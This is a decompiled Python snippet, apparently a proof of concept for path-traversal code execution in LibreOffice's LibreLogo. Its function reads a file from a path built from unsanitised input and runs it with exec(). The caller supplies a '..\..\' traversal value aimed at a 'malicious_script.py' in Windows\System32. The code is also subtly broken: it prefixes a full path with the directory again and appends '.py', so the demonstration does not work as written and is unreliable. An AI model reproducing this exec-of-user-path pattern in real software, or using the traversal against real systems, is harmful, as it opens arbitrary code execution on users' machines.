# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 864_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 649 bytes
import os

def execute_librelogo_script(script_name):
    script_path = f"C:\\Program Files\\LibreOffice\\share\\librelogo\\{script_name}.py"
    exec(open(script_path).read())


malicious_script = "C:\\Program Files\\LibreOffice\\share\\librelogo\\..\\..\\..\\..\\..\\..\\Windows\\System32\\malicious_script.py"
execute_librelogo_script(malicious_script)

# okay decompiling 864_1.pyc
